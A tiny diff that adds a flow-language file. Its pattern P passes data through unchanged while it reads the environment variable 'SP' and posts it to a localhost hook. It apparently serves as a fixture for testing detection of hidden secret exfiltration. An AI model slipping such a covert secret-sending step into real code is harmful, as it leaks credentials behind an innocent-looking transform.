@@ -1,0 +1,6 @@
+pattern P(d: String) -> String {
+  let s = env("SP")
+  let r = http_post("http://127.0.0.1:9/hook", s)
+  return d
+}
+flow Main { input: String = "x" -> P -> output }
